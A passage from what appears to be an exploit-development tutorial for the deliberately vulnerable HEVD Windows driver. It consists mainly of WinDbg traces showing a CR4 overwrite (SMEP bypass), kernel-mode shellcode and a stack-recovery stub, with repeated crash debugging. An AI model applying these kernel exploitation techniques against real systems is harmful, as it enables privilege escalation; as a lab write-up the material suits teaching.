<span class="normal"><a href="#__codelineno-26-34">34</a></span>
<span class="normal"><a href="#__codelineno-26-35">35</a></span>
<span class="normal"><a href="#__codelineno-26-36">36</a></span>
<span class="normal"><a href="#__codelineno-26-37">37</a></span>
<span class="normal"><a href="#__codelineno-26-38">38</a></span>
<span class="normal"><a href="#__codelineno-26-39">39</a></span>
<span class="normal"><a href="#__codelineno-26-40">40</a></span>
<span class="normal"><a href="#__codelineno-26-41">41</a></span>
<span class="normal"><a href="#__codelineno-26-42">42</a></span>
<span class="normal"><a href="#__codelineno-26-43">43</a></span>
<span class="normal"><a href="#__codelineno-26-44">44</a></span>
<span class="normal"><a href="#__codelineno-26-45">45</a></span>
<span class="normal"><a href="#__codelineno-26-46">46</a></span>
<span class="normal"><a href="#__codelineno-26-47">47</a></span>
<span class="normal"><a href="#__codelineno-26-48">48</a></span>
<span class="normal"><a href="#__codelineno-26-49">49</a></span>
<span class="normal"><a href="#__codelineno-26-50">50</a></span>
<span class="normal"><a href="#__codelineno-26-51">51</a></span>
<span class="normal"><a href="#__codelineno-26-52">52</a></span>
<span class="normal"><a href="#__codelineno-26-53">53</a></span>
<span class="normal"><a href="#__codelineno-26-54">54</a></span>
<span class="normal"><a href="#__codelineno-26-55">55</a></span>
<span class="normal"><a href="#__codelineno-26-56">56</a></span>
<span class="normal"><a href="#__codelineno-26-57">57</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-26-1" name="__codelineno-26-1"></a>0: kd&gt; bp nt!KiSetPageAttributesTable+0xc5
<a id="__codelineno-26-2" name="__codelineno-26-2"></a>
<a id="__codelineno-26-3" name="__codelineno-26-3"></a>0: kd&gt; g
<a id="__codelineno-26-4" name="__codelineno-26-4"></a>Breakpoint 0 hit
<a id="__codelineno-26-5" name="__codelineno-26-5"></a>nt!KiSetPageAttributesTable+0xc5:
<a id="__codelineno-26-6" name="__codelineno-26-6"></a>fffff801`1ab0ebf9 59              pop     rcx
<a id="__codelineno-26-7" name="__codelineno-26-7"></a>
<a id="__codelineno-26-8" name="__codelineno-26-8"></a>1: kd&gt; p
<a id="__codelineno-26-9" name="__codelineno-26-9"></a>nt!KiSetPageAttributesTable+0xc6:
<a id="__codelineno-26-10" name="__codelineno-26-10"></a>fffff801`1ab0ebfa c3              ret
<a id="__codelineno-26-11" name="__codelineno-26-11"></a>
<a id="__codelineno-26-12" name="__codelineno-26-12"></a>1: kd&gt; 
<a id="__codelineno-26-13" name="__codelineno-26-13"></a>nt!KeFlushCurrentTbImmediately+0x17:
<a id="__codelineno-26-14" name="__codelineno-26-14"></a>fffff801`1a7fff37 0f22e1          mov     cr4,rcx
<a id="__codelineno-26-15" name="__codelineno-26-15"></a>
<a id="__codelineno-26-16" name="__codelineno-26-16"></a>1: kd&gt; 
<a id="__codelineno-26-17" name="__codelineno-26-17"></a>000001f2`afa60000 4150            push    r8
<a id="__codelineno-26-18" name="__codelineno-26-18"></a>1: kd&gt; 
<a id="__codelineno-26-19" name="__codelineno-26-19"></a>000001f2`afa60002 4151            push    r9
<a id="__codelineno-26-20" name="__codelineno-26-20"></a>1: kd&gt; 
<a id="__codelineno-26-21" name="__codelineno-26-21"></a>000001f2`afa60004 50              push    rax
<a id="__codelineno-26-22" name="__codelineno-26-22"></a>
<a id="__codelineno-26-23" name="__codelineno-26-23"></a>[...]
<a id="__codelineno-26-24" name="__codelineno-26-24"></a>
<a id="__codelineno-26-25" name="__codelineno-26-25"></a>1: kd&gt; 
<a id="__codelineno-26-26" name="__codelineno-26-26"></a>000001f2`afa60051 59              pop     rcx
<a id="__codelineno-26-27" name="__codelineno-26-27"></a>1: kd&gt; 
<a id="__codelineno-26-28" name="__codelineno-26-28"></a>000001f2`afa60052 4159            pop     r9
<a id="__codelineno-26-29" name="__codelineno-26-29"></a>1: kd&gt; 
<a id="__codelineno-26-30" name="__codelineno-26-30"></a>000001f2`afa60054 4158            pop     r8
<a id="__codelineno-26-31" name="__codelineno-26-31"></a>
<a id="__codelineno-26-32" name="__codelineno-26-32"></a>1: kd&gt; k
<a id="__codelineno-26-33" name="__codelineno-26-33"></a> # Child-SP          RetAddr               Call Site
<a id="__codelineno-26-34" name="__codelineno-26-34"></a>00 fffff909`439e07c0 59d28afc`59d28afc     0x0000016e`841b0056
<a id="__codelineno-26-35" name="__codelineno-26-35"></a>01 fffff909`439e07c8 f211216f`51bc83f5     0x59d28afc`59d28afc
<a id="__codelineno-26-36" name="__codelineno-26-36"></a>02 fffff909`439e07d0 fa712831`7e520c4b     0xf211216f`51bc83f5
<a id="__codelineno-26-37" name="__codelineno-26-37"></a>03 fffff909`439e07d8 ffffa6d3`fa71295f     0xfa712831`7e520c4b
<a id="__codelineno-26-38" name="__codelineno-26-38"></a>04 fffff909`439e07e0 fffff80e`c5aa85d0     0xffffa6d3`fa71295f
<a id="__codelineno-26-39" name="__codelineno-26-39"></a>05 fffff909`439e07e8 00000000`00222037     HEVD! ?? ::NNGAKEGL::`string&#39;
<a id="__codelineno-26-40" name="__codelineno-26-40"></a>06 fffff909`439e07f0 00000000`00000002     0x222037
<a id="__codelineno-26-41" name="__codelineno-26-41"></a>07 fffff909`439e07f8 fffff802`dfb18799     0x2
<a id="__codelineno-26-42" name="__codelineno-26-42"></a>08 fffff909`439e0800 fffff802`dffb887b     nt!IofCallDriver+0x59
<a id="__codelineno-26-43" name="__codelineno-26-43"></a>09 fffff909`439e0840 fffff802`dffbcdea     nt!IopSynchronousServiceTail+0x1ab
<a id="__codelineno-26-44" name="__codelineno-26-44"></a>0a fffff909`439e08f0 fffff802`dffba7d6     nt!IopXxxControlFile+0x68a
<a id="__codelineno-26-45" name="__codelineno-26-45"></a>0b fffff909`439e0a20 fffff802`dfbd6243     nt!NtDeviceIoControlFile+0x56
<a id="__codelineno-26-46" name="__codelineno-26-46"></a>0c fffff909`439e0a90 00007ffb`0cd6aa84     nt!KiSystemServiceCopyEnd+0x13
<a id="__codelineno-26-47" name="__codelineno-26-47"></a>0d 00000004`1d9ffa28 00007ffb`09722766     ntdll!NtDeviceIoControlFile+0x14
<a id="__codelineno-26-48" name="__codelineno-26-48"></a>0e 00000004`1d9ffa30 00007ff6`48e3a108     0x00007ffb`09722766
<a id="__codelineno-26-49" name="__codelineno-26-49"></a>0f 00000004`1d9ffa38 00000000`00000000     0x00007ff6`48e3a108
<a id="__codelineno-26-50" name="__codelineno-26-50"></a>
<a id="__codelineno-26-51" name="__codelineno-26-51"></a>1: kd&gt; r
<a id="__codelineno-26-52" name="__codelineno-26-52"></a>rax=ffffe4061dad7080 rbx=fffff802dfe93bf9 rcx=fffff909439dff90
<a id="__codelineno-26-53" name="__codelineno-26-53"></a>rdx=0000086540872a30 rsi=0000000000070678 rdi=fffff802dfb84f37
<a id="__codelineno-26-54" name="__codelineno-26-54"></a>rip=0000016e841b0056 rsp=fffff909439e07c0 rbp=ffffe4061d8fd6e0
<a id="__codelineno-26-55" name="__codelineno-26-55"></a> r8=0000000000000000  r9=0000000000000000 r10=0000000000000000
<a id="__codelineno-26-56" name="__codelineno-26-56"></a>r11=fffff909439e0790 r12=ffffe4061e001a00 r13=ffffe4061c6d0850
<a id="__codelineno-26-57" name="__codelineno-26-57"></a>r14=0000016e841b0000 r15=4141414141414141
</code></pre></div></td></tr></table></div>
<p>What's pretty obvious here is that our stack is significantly corrupted. Our register state is not in a terrible state, but still needs some fixing. At this point we'll add another function to our shellcode called <code>KERNEL_RECOVERY</code> and we'll clean up some stuff following the execution of our shellcode.</p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-27-1">1</a></span>
<span class="normal"><a href="#__codelineno-27-2">2</a></span>
<span class="normal"><a href="#__codelineno-27-3">3</a></span>
<span class="normal"><a href="#__codelineno-27-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-27-1" name="__codelineno-27-1"></a>KERNEL_RECOVERY:
<a id="__codelineno-27-2" name="__codelineno-27-2"></a>    xor rax, rax
<a id="__codelineno-27-3" name="__codelineno-27-3"></a>    xor rsi, rsi
<a id="__codelineno-27-4" name="__codelineno-27-4"></a>    ret
</code></pre></div></td></tr></table></div>
<p>It is fairly obvious that we're not going to be able to return to anything such as <code>HEVD!DoubleFetchIoctlHandler+0x17</code> or <code>HEVD!IrpDeviceIoCtlHandler+0x26d</code> even if we could, we'll be missing the address of the <abbr title="Input Output Request Packet">IRP</abbr> and these will eventually access violate when trying to dereference that address. If you remember from the last post we added 0x40 to RSP which based on the call stack above would return us to <code>fffff909439e0800</code> which is <code>nt!IofCallDriver+0x59</code>. Let's do the same here and add <code>0x40</code> to RSP.</p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-28-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-28-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-28-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-28-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-28-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-28-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-28-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-28-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-28-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-28-10">10</a></span>
<span class="normal"><a href="#__codelineno-28-11">11</a></span>
<span class="normal"><a href="#__codelineno-28-12">12</a></span>
<span class="normal"><a href="#__codelineno-28-13">13</a></span>
<span class="normal"><a href="#__codelineno-28-14">14</a></span>
<span class="normal"><a href="#__codelineno-28-15">15</a></span>
<span class="normal"><a href="#__codelineno-28-16">16</a></span>
<span class="normal"><a href="#__codelineno-28-17">17</a></span>
<span class="normal"><a href="#__codelineno-28-18">18</a></span>
<span class="normal"><a href="#__codelineno-28-19">19</a></span>
<span class="normal"><a href="#__codelineno-28-20">20</a></span>
<span class="normal"><a href="#__codelineno-28-21">21</a></span>
<span class="normal"><a href="#__codelineno-28-22">22</a></span>
<span class="normal"><a href="#__codelineno-28-23">23</a></span>
<span class="normal"><a href="#__codelineno-28-24">24</a></span>
<span class="normal"><a href="#__codelineno-28-25">25</a></span>
<span class="normal"><a href="#__codelineno-28-26">26</a></span>
<span class="normal"><a href="#__codelineno-28-27">27</a></span>
<span class="normal"><a href="#__codelineno-28-28">28</a></span>
<span class="normal"><a href="#__codelineno-28-29">29</a></span>
<span class="normal"><a href="#__codelineno-28-30">30</a></span>
<span class="normal"><a href="#__codelineno-28-31">31</a></span>
<span class="normal"><a href="#__codelineno-28-32">32</a></span>
<span class="normal"><a href="#__codelineno-28-33">33</a></span>
<span class="normal"><a href="#__codelineno-28-34">34</a></span>
<span class="normal"><a href="#__codelineno-28-35">35</a></span>
<span class="normal"><a href="#__codelineno-28-36">36</a></span>
<span class="normal"><a href="#__codelineno-28-37">37</a></span>
<span class="normal"><a href="#__codelineno-28-38">38</a></span>
<span class="normal"><a href="#__codelineno-28-39">39</a></span>
<span class="normal"><a href="#__codelineno-28-40">40</a></span>
<span class="normal"><a href="#__codelineno-28-41">41</a></span>
<span class="normal"><a href="#__codelineno-28-42">42</a></span>
<span class="normal"><a href="#__codelineno-28-43">43</a></span>
<span class="normal"><a href="#__codelineno-28-44">44</a></span>
<span class="normal"><a href="#__codelineno-28-45">45</a></span>
<span class="normal"><a href="#__codelineno-28-46">46</a></span>
<span class="normal"><a href="#__codelineno-28-47">47</a></span>
<span class="normal"><a href="#__codelineno-28-48">48</a></span>
<span class="normal"><a href="#__codelineno-28-49">49</a></span>
<span class="normal"><a href="#__codelineno-28-50">50</a></span>
<span class="normal"><a href="#__codelineno-28-51">51</a></span>
<span class="normal"><a href="#__codelineno-28-52">52</a></span>
<span class="normal"><a href="#__codelineno-28-53">53</a></span>
<span class="normal"><a href="#__codelineno-28-54">54</a></span>
<span class="normal"><a href="#__codelineno-28-55">55</a></span>
<span class="normal"><a href="#__codelineno-28-56">56</a></span>
<span class="normal"><a href="#__codelineno-28-57">57</a></span>
<span class="normal"><a href="#__codelineno-28-58">58</a></span>
<span class="normal"><a href="#__codelineno-28-59">59</a></span>
<span class="normal"><a href="#__codelineno-28-60">60</a></span>
<span class="normal"><a href="#__codelineno-28-61">61</a></span>
<span class="normal"><a href="#__codelineno-28-62">62</a></span>
<span class="normal"><a href="#__codelineno-28-63">63</a></span>
<span class="normal"><a href="#__codelineno-28-64">64</a></span>
<span class="normal"><a href="#__codelineno-28-65">65</a></span>
<span class="normal"><a href="#__codelineno-28-66">66</a></span>
<span class="normal"><a href="#__codelineno-28-67">67</a></span>
<span class="normal"><a href="#__codelineno-28-68">68</a></span>
<span class="normal"><a href="#__codelineno-28-69">69</a></span>
<span class="normal"><a href="#__codelineno-28-70">70</a></span>
<span class="normal"><a href="#__codelineno-28-71">71</a></span>
<span class="normal"><a href="#__codelineno-28-72">72</a></span>
<span class="normal"><a href="#__codelineno-28-73">73</a></span>
<span class="normal"><a href="#__codelineno-28-74">74</a></span>
<span class="normal"><a href="#__codelineno-28-75">75</a></span>
<span class="normal"><a href="#__codelineno-28-76">76</a></span>
<span class="normal"><a href="#__codelineno-28-77">77</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-28-1" name="__codelineno-28-1"></a>1: kd&gt; bp nt!KiSetPageAttributesTable+0xc5
<a id="__codelineno-28-2" name="__codelineno-28-2"></a>
<a id="__codelineno-28-3" name="__codelineno-28-3"></a>1: kd&gt; g
<a id="__codelineno-28-4" name="__codelineno-28-4"></a>Breakpoint 0 hit
<a id="__codelineno-28-5" name="__codelineno-28-5"></a>nt!KiSetPageAttributesTable+0xc5:
<a id="__codelineno-28-6" name="__codelineno-28-6"></a>fffff801`42881bf9 59              pop     rcx
<a id="__codelineno-28-7" name="__codelineno-28-7"></a>1: kd&gt; p
<a id="__codelineno-28-8" name="__codelineno-28-8"></a>nt!KiSetPageAttributesTable+0xc6:
<a id="__codelineno-28-9" name="__codelineno-28-9"></a>fffff801`42881bfa c3              ret
<a id="__codelineno-28-10" name="__codelineno-28-10"></a>1: kd&gt; 
<a id="__codelineno-28-11" name="__codelineno-28-11"></a>nt!KeFlushCurrentTbImmediately+0x17:
<a id="__codelineno-28-12" name="__codelineno-28-12"></a>fffff801`42572f37 0f22e1          mov     tmm,rcx
<a id="__codelineno-28-13" name="__codelineno-28-13"></a>
<a id="__codelineno-28-14" name="__codelineno-28-14"></a>1: kd&gt; 
<a id="__codelineno-28-15" name="__codelineno-28-15"></a>00000270`b9140000 4150            push    r8
<a id="__codelineno-28-16" name="__codelineno-28-16"></a>1: kd&gt; 
<a id="__codelineno-28-17" name="__codelineno-28-17"></a>00000270`b9140002 4151            push    r9
<a id="__codelineno-28-18" name="__codelineno-28-18"></a>1: kd&gt; 
<a id="__codelineno-28-19" name="__codelineno-28-19"></a>00000270`b9140004 50              push    rax
<a id="__codelineno-28-20" name="__codelineno-28-20"></a>
<a id="__codelineno-28-21" name="__codelineno-28-21"></a>[...]
<a id="__codelineno-28-22" name="__codelineno-28-22"></a>
<a id="__codelineno-28-23" name="__codelineno-28-23"></a>1: kd&gt; 
<a id="__codelineno-28-24" name="__codelineno-28-24"></a>00000270`b9140051 59              pop     rcx
<a id="__codelineno-28-25" name="__codelineno-28-25"></a>1: kd&gt; 
<a id="__codelineno-28-26" name="__codelineno-28-26"></a>00000270`b9140052 4159            pop     r9
<a id="__codelineno-28-27" name="__codelineno-28-27"></a>1: kd&gt; 
<a id="__codelineno-28-28" name="__codelineno-28-28"></a>00000270`b9140054 4158            pop     r8
<a id="__codelineno-28-29" name="__codelineno-28-29"></a>1: kd&gt; 
<a id="__codelineno-28-30" name="__codelineno-28-30"></a>00000270`b9140056 4831c0          xor     rax,rax
<a id="__codelineno-28-31" name="__codelineno-28-31"></a>1: kd&gt; 
<a id="__codelineno-28-32" name="__codelineno-28-32"></a>00000270`b9140059 4831f6          xor     rsi,rsi
<a id="__codelineno-28-33" name="__codelineno-28-33"></a>1: kd&gt; 
<a id="__codelineno-28-34" name="__codelineno-28-34"></a>00000270`b914005c 4883c440        add     rsp,40h
<a id="__codelineno-28-35" name="__codelineno-28-35"></a>1: kd&gt; 
<a id="__codelineno-28-36" name="__codelineno-28-36"></a>00000270`b9140060 c3              ret
<a id="__codelineno-28-37" name="__codelineno-28-37"></a>
<a id="__codelineno-28-38" name="__codelineno-28-38"></a>1: kd&gt; k
<a id="__codelineno-28-39" name="__codelineno-28-39"></a> # Child-SP          RetAddr               Call Site
<a id="__codelineno-28-40" name="__codelineno-28-40"></a>00 fffffb0e`e55c6800 ffffb780`07006180     0x00000270`b9140060
<a id="__codelineno-28-41" name="__codelineno-28-41"></a>01 fffffb0e`e55c6808 ffffb780`077dc380     0xffffb780`07006180
<a id="__codelineno-28-42" name="__codelineno-28-42"></a>02 fffffb0e`e55c6810 00000000`00000001     0xffffb780`077dc380
<a id="__codelineno-28-43" name="__codelineno-28-43"></a>03 fffffb0e`e55c6818 ffffb780`077dc380     0x1
<a id="__codelineno-28-44" name="__codelineno-28-44"></a>04 fffffb0e`e55c6820 ffffca00`0008e8c0     0xffffb780`077dc380
<a id="__codelineno-28-45" name="__codelineno-28-45"></a>05 fffffb0e`e55c6828 fffffb0e`e55c6940     0xffffca00`0008e8c0
<a id="__codelineno-28-46" name="__codelineno-28-46"></a>06 fffffb0e`e55c6830 ffffb780`077dc380     0xfffffb0e`e55c6940
<a id="__codelineno-28-47" name="__codelineno-28-47"></a>07 fffffb0e`e55c6838 fffff801`429a687b     0xffffb780`077dc380
<a id="__codelineno-28-48" name="__codelineno-28-48"></a>08 fffffb0e`e55c6840 fffff801`429aadea     nt!IopSynchronousServiceTail+0x1ab
<a id="__codelineno-28-49" name="__codelineno-28-49"></a>09 fffffb0e`e55c68f0 fffff801`429a87d6     nt!IopXxxControlFile+0x68a
<a id="__codelineno-28-50" name="__codelineno-28-50"></a>0a fffffb0e`e55c6a20 fffff801`425c4243     nt!NtDeviceIoControlFile+0x56
<a id="__codelineno-28-51" name="__codelineno-28-51"></a>0b fffffb0e`e55c6a90 00007ffa`85edaa84     nt!KiSystemServiceCopyEnd+0x13
<a id="__codelineno-28-52" name="__codelineno-28-52"></a>0c 000000c4`4e1ffb28 00007ffa`82fc2766     ntdll!NtDeviceIoControlFile+0x14
<a id="__codelineno-28-53" name="__codelineno-28-53"></a>0d 000000c4`4e1ffb30 00007ff7`c34aa108     0x00007ffa`82fc2766
<a id="__codelineno-28-54" name="__codelineno-28-54"></a>0e 000000c4`4e1ffb38 00000000`00000000     0x00007ff7`c34aa108
<a id="__codelineno-28-55" name="__codelineno-28-55"></a>
<a id="__codelineno-28-56" name="__codelineno-28-56"></a>1: kd&gt; r
<a id="__codelineno-28-57" name="__codelineno-28-57"></a>rax=0000000000000000 rbx=fffff80142881bf9 rcx=fffffb0ee55c5f90
<a id="__codelineno-28-58" name="__codelineno-28-58"></a>rdx=00000761d3bf8ba0 rsi=0000000000000000 rdi=fffff80142572f37
<a id="__codelineno-28-59" name="__codelineno-28-59"></a>rip=00000270b9140060 rsp=fffffb0ee55c6800 rbp=ffffb78007006180
<a id="__codelineno-28-60" name="__codelineno-28-60"></a> r8=0000000000000000  r9=0000000000000000 r10=0000000000000000
<a id="__codelineno-28-61" name="__codelineno-28-61"></a>r11=fffffb0ee55c6790 r12=ffffb780077dc380 r13=ffffb7800684da20
<a id="__codelineno-28-62" name="__codelineno-28-62"></a>r14=00000270b9140000 r15=4141414141414141
<a id="__codelineno-28-63" name="__codelineno-28-63"></a>iopl=0         nv up ei ng nz na po nc
<a id="__codelineno-28-64" name="__codelineno-28-64"></a>cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00000286
<a id="__codelineno-28-65" name="__codelineno-28-65"></a>00000270`b9140060 c3              ret
<a id="__codelineno-28-66" name="__codelineno-28-66"></a>
<a id="__codelineno-28-67" name="__codelineno-28-67"></a>1: kd&gt; p
<a id="__codelineno-28-68" name="__codelineno-28-68"></a>ffffb780`07006180 06              ???
<a id="__codelineno-28-69" name="__codelineno-28-69"></a>
<a id="__codelineno-28-70" name="__codelineno-28-70"></a>1: kd&gt; p
<a id="__codelineno-28-71" name="__codelineno-28-71"></a>
<a id="__codelineno-28-72" name="__codelineno-28-72"></a>*** Fatal System Error: 0x00000050
<a id="__codelineno-28-73" name="__codelineno-28-73"></a>                       (0xFFFFB78007006180,0x0000000000000011,0xFFFFB78007006180,0x000000000000000C)
<a id="__codelineno-28-74" name="__codelineno-28-74"></a>
<a id="__codelineno-28-75" name="__codelineno-28-75"></a>
<a id="__codelineno-28-76" name="__codelineno-28-76"></a>nt!DbgBreakPointWithStatus:
<a id="__codelineno-28-77" name="__codelineno-28-77"></a>fffff801`425bb810 cc              int     3
</code></pre></div></td></tr></table></div>
<p>Okay great, an access violation. This frame seems to be corrupted. So what happens if we return to the frame before it at <code>RSP + 0x38</code> - lets try.</p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-29-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-29-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-29-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-29-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-29-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-29-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-29-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-29-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-29-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-29-10">10</a></span>
<span class="normal"><a href="#__codelineno-29-11">11</a></span>
<span class="normal"><a href="#__codelineno-29-12">12</a></span>
<span class="normal"><a href="#__codelineno-29-13">13</a></span>
<span class="normal"><a href="#__codelineno-29-14">14</a></span>
<span class="normal"><a href="#__codelineno-29-15">15</a></span>
<span class="normal"><a href="#__codelineno-29-16">16</a></span>
<span class="normal"><a href="#__codelineno-29-17">17</a></span>
<span class="normal"><a href="#__codelineno-29-18">18</a></span>
<span class="normal"><a href="#__codelineno-29-19">19</a></span>
<span class="normal"><a href="#__codelineno-29-20">20</a></span>
<span class="normal"><a href="#__codelineno-29-21">21</a></span>
<span class="normal"><a href="#__codelineno-29-22">22</a></span>
<span class="normal"><a href="#__codelineno-29-23">23</a></span>
<span class="normal"><a href="#__codelineno-29-24">24</a></span>
<span class="normal"><a href="#__codelineno-29-25">25</a></span>
<span class="normal"><a href="#__codelineno-29-26">26</a></span>
<span class="normal"><a href="#__codelineno-29-27">27</a></span>
<span class="normal"><a href="#__codelineno-29-28">28</a></span>
<span class="normal"><a href="#__codelineno-29-29">29</a></span>
<span class="normal"><a href="#__codelineno-29-30">30</a></span>
<span class="normal"><a href="#__codelineno-29-31">31</a></span>
<span class="normal"><a href="#__codelineno-29-32">32</a></span>
<span class="normal"><a href="#__codelineno-29-33">33</a></span>
<span class="normal"><a href="#__codelineno-29-34">34</a></span>
<span class="normal"><a href="#__codelineno-29-35">35</a></span>
<span class="normal"><a href="#__codelineno-29-36">36</a></span>
<span class="normal"><a href="#__codelineno-29-37">37</a></span>
<span class="normal"><a href="#__codelineno-29-38">38</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-29-1" name="__codelineno-29-1"></a>[...]
<a id="__codelineno-29-2" name="__codelineno-29-2"></a>
<a id="__codelineno-29-3" name="__codelineno-29-3"></a>1: kd&gt; 
<a id="__codelineno-29-4" name="__codelineno-29-4"></a>000001ba`b7730060 c3              ret
<a id="__codelineno-29-5" name="__codelineno-29-5"></a>
<a id="__codelineno-29-6" name="__codelineno-29-6"></a>1: kd&gt; 
<a id="__codelineno-29-7" name="__codelineno-29-7"></a>nt!IofCallDriver+0x59:
<a id="__codelineno-29-8" name="__codelineno-29-8"></a>fffff801`78cfd799 4883c438        add     rsp,38h
<a id="__codelineno-29-9" name="__codelineno-29-9"></a>1: kd&gt; 
<a id="__codelineno-29-10" name="__codelineno-29-10"></a>nt!IofCallDriver+0x5d:
<a id="__codelineno-29-11" name="__codelineno-29-11"></a>fffff801`78cfd79d c3              ret
<a id="__codelineno-29-12" name="__codelineno-29-12"></a>1: kd&gt; 
<a id="__codelineno-29-13" name="__codelineno-29-13"></a>nt!IopSynchronousServiceTail+0x1ab:
<a id="__codelineno-29-14" name="__codelineno-29-14"></a>fffff801`7919d87b 448bf0          mov     r14d,eax
<a id="__codelineno-29-15" name="__codelineno-29-15"></a>1: kd&gt; 
<a id="__codelineno-29-16" name="__codelineno-29-16"></a>nt!IopSynchronousServiceTail+0x1ae:
<a id="__codelineno-29-17" name="__codelineno-29-17"></a>fffff801`7919d87e 4084f6          test    sil,sil
<a id="__codelineno-29-18" name="__codelineno-29-18"></a>1: kd&gt; p
<a id="__codelineno-29-19" name="__codelineno-29-19"></a>nt!IopSynchronousServiceTail+0x1b1:
<a id="__codelineno-29-20" name="__codelineno-29-20"></a>fffff801`7919d881 7508            jne     nt!IopSynchronousServiceTail+0x1bb (fffff801`7919d88b)
<a id="__codelineno-29-21" name="__codelineno-29-21"></a>1: kd&gt; 
<a id="__codelineno-29-22" name="__codelineno-29-22"></a>nt!IopSynchronousServiceTail+0x1b3:
<a id="__codelineno-29-23" name="__codelineno-29-23"></a>fffff801`7919d883 498bcc          mov     rcx,r12
<a id="__codelineno-29-24" name="__codelineno-29-24"></a>1: kd&gt; 
<a id="__codelineno-29-25" name="__codelineno-29-25"></a>nt!IopSynchronousServiceTail+0x1b6:
<a id="__codelineno-29-26" name="__codelineno-29-26"></a>fffff801`7919d886 e845c5b5ff      call    nt!ObDereferenceObjectDeferDelete (fffff801`78cf9dd0)
<a id="__codelineno-29-27" name="__codelineno-29-27"></a>1: kd&gt; 
<a id="__codelineno-29-28" name="__codelineno-29-28"></a>nt!IopSynchronousServiceTail+0x1bb:
<a id="__codelineno-29-29" name="__codelineno-29-29"></a>fffff801`7919d88b 4c8b642440      mov     r12,qword ptr [rsp+40h]
<a id="__codelineno-29-30" name="__codelineno-29-30"></a>
<a id="__codelineno-29-31" name="__codelineno-29-31"></a>[...]
<a id="__codelineno-29-32" name="__codelineno-29-32"></a>
<a id="__codelineno-29-33" name="__codelineno-29-33"></a>1: kd&gt; g
<a id="__codelineno-29-34" name="__codelineno-29-34"></a>*** Fatal System Error: 0x0000003b
<a id="__codelineno-29-35" name="__codelineno-29-35"></a>                       (0x00000000C0000005,0xFFFFF80178CF92A6,0xFFFF8F885D9DAD60,0x0000000000000000)
<a id="__codelineno-29-36" name="__codelineno-29-36"></a>
<a id="__codelineno-29-37" name="__codelineno-29-37"></a>nt!DbgBreakPointWithStatus:
<a id="__codelineno-29-38" name="__codelineno-29-38"></a>fffff801`78db2810 cc              int     3
</code></pre></div></td></tr></table></div>
<p>At last, we have some progress! We still have an access violation but, we did briefly resume execution. Let's check out what caused it to fail.</p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-30-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-30-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-30-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-30-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-30-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-30-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-30-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-30-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-30-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-30-10">10</a></span>
<span class="normal"><a href="#__codelineno-30-11">11</a></span>
<span class="normal"><a href="#__codelineno-30-12">12</a></span>
<span class="normal"><a href="#__codelineno-30-13">13</a></span>
<span class="normal"><a href="#__codelineno-30-14">14</a></span>
<span class="normal"><a href="#__codelineno-30-15">15</a></span>
<span class="normal"><a href="#__codelineno-30-16">16</a></span>
<span class="normal"><a href="#__codelineno-30-17">17</a></span>
<span class="normal"><a href="#__codelineno-30-18">18</a></span>
<span class="normal"><a href="#__codelineno-30-19">19</a></span>
<span class="normal"><a href="#__codelineno-30-20">20</a></span>
<span class="normal"><a href="#__codelineno-30-21">21</a></span>
<span class="normal"><a href="#__codelineno-30-22">22</a></span>
<span class="normal"><a href="#__codelineno-30-23">23</a></span>
<span class="normal"><a href="#__codelineno-30-24">24</a></span>
<span class="normal"><a href="#__codelineno-30-25">25</a></span>
<span class="normal"><a href="#__codelineno-30-26">26</a></span>
<span class="normal"><a href="#__codelineno-30-27">27</a></span>
<span class="normal"><a href="#__codelineno-30-28">28</a></span>
<span class="normal"><a href="#__codelineno-30-29">29</a></span>
<span class="normal"><a href="#__codelineno-30-30">30</a></span>
<span class="normal"><a href="#__codelineno-30-31">31</a></span>
<span class="normal"><a href="#__codelineno-30-32">32</a></span>
<span class="normal"><a href="#__codelineno-30-33">33</a></span>
<span class="normal"><a href="#__codelineno-30-34">34</a></span>
<span class="normal"><a href="#__codelineno-30-35">35</a></span>
<span class="normal"><a href="#__codelineno-30-36">36</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-30-1" name="__codelineno-30-1"></a>1: kd&gt; 
<a id="__codelineno-30-2" name="__codelineno-30-2"></a>00000178`eecb005c 4883c438        add     rsp,38h
<a id="__codelineno-30-3" name="__codelineno-30-3"></a>1: kd&gt; 
<a id="__codelineno-30-4" name="__codelineno-30-4"></a>00000178`eecb0060 c3              ret
<a id="__codelineno-30-5" name="__codelineno-30-5"></a>
